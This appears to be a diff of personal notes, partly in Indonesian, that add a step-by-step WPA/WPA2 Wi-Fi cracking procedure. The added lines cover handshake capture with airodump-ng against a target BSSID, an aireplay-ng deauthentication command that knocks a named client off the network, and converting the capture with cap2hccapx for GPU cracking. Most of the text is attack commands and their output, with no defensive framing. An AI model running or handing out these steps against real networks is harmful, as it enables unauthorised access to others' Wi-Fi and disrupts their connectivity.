@@ -28,6 +28,20 @@ run: service network-manager restart
 ~# iwconfig
 
 ---wifi wpa/wpa2 cracking---
+(scrren atas)
 ~# airodump-ng wlan0
-~# airodump-ng --bssid 60:31:97:31:8C:9C --channel 3 --write wpa_handsake wlan0
+~# airodump-ng --bssid D8:32:14:30:0C:B1(bssid target) --channel 3(channel target) --write wpa_handsake wlan0
+(screen bawah)
+~# aireplay-ng --deauth 4 -a D8:32:14:30:0C:B1(bssid target) -c F8:9E:94:01:75:FC(client) wlan0
+
 target: terjadi handsake
+CH  1 ][ Elapsed: 4 mins ][ 2022-09-07 16:05 ][ WPA handshake: D8:32:14:30:0C:B1 
+Pastikan di directory Home sudah ada file .cap
+
+-install tools untuk crack file .cap-
+~# apt-get update
+~# apt-get install hashcat-utils
+-convert .cap to .capx-
+~# /usr/lib/hashcat-utils/cap2hccapx.bin (your .cap file) (create your output .hccapx file name)
+-create GPU Cloud Engine on Linode-
+follow 'https://www.youtube.com/watch?v=s4jhe4XsoZI'
